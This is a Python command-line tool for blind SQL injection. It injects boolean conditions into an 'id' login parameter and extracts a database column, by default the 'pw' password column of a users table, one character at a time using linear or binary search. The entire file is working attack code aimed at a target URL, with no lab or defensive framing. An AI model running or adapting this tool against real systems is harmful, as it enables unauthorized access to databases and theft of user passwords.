#!/usr/bin/env python3
"""
Advanced Blind SQL Injection Tool
Supports linear and binary search methods for data extraction.
"""

import argparse
import string
import sys

import requests


class BlindSQLi:
    def __init__(
        self, url, cookies=None, success_indicator="OK", error_indicator=None, timeout=5
    ):
        self.url = url
        self.cookies = cookies or {}
        self.success_indicator = success_indicator
        self.error_indicator = error_indicator
        self.timeout = timeout
        self.charset = string.ascii_letters + string.digits + "!@#$%^&*()_+"

    def _check(self, payload):
        params = {"id": f"admin' and ({payload})--", "pw": "a"}
        try:
            response = requests.get(
                self.url, params=params, cookies=self.cookies, timeout=self.timeout
            )
            if self.error_indicator and self.error_indicator in response.text:
                print(f" [!] Error detected in response: {self.error_indicator}")
                return False
            return self.success_indicator in response.text
        except requests.RequestException as e:
            print(f" [!] Request error: {e}")
            return False

    def extract_linear(self, column, table, max_len=32):
        print(f"[*] Starting linear extraction for {column} in {table}")
        extracted = ""
        for i in range(1, max_len + 1):
            found = False
            sys.stdout.write(f"[*] Char {i:02}: ")
            sys.stdout.flush()
            for char in self.charset:
                # Adjust payload based on specific DB if needed, this is generic
                payload = f"substring({column},{i},1)='{char}'"
                if self._check(payload):
                    extracted += char
                    sys.stdout.write(f"{char} ")
                    sys.stdout.flush()
                    found = True
                    break
            if not found:
                print("Not found. Stopping.")
                break
        return extracted

    def extract_binary(self, column, table, max_len=32):
        print(f"[*] Starting binary search extraction for {column} in {table}")
        extracted = ""
        for i in range(1, max_len + 1):
            low = 32
            high = 126
            current_char_code = 0

            # Check length first
            if not self._check(f"len({column})>={i}"):
                print(f"[*] Reached end of string at index {i - 1}.")
                break

            sys.stdout.write(f"[*] Char {i:02}: ")
            sys.stdout.flush()

            while low <= high:
                mid = (low + high) // 2
                if self._check(f"ascii(substring({column},{i},1))>{mid}"):
                    low = mid + 1
                else:
                    current_char_code = mid
                    high = mid - 1

            char = chr(current_char_code)
            extracted += char
            sys.stdout.write(f"{char} (ASCII: {current_char_code}) ")
            sys.stdout.flush()
        return extracted


def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument(
        "--method",
        choices=["linear", "binary"],
        default="binary",
        help="Extraction method",
    )
    parser.add_argument("--column", default="pw", help="Column to extract")
    parser.add_argument("--table", default="users", help="Table to extract from")
    parser.add_argument("--success", default="OK", help="String indicating success")
    parser.add_argument("--maxlen", type=int, default=32, help="Max length to extract")

    args = parser.parse_args()

    # Example cookie setup - in a real tool you'd want this more flexible
    cookies = {}

    sqli = BlindSQLi(args.url, cookies=cookies, success_indicator=args.success)

    if args.method == "linear":
        result = sqli.extract_linear(args.column, args.table, args.maxlen)
    else:
        result = sqli.extract_binary(args.column, args.table, args.maxlen)

    print(f" [+] Extracted: {result}")


if __name__ == "__main__":
    main()
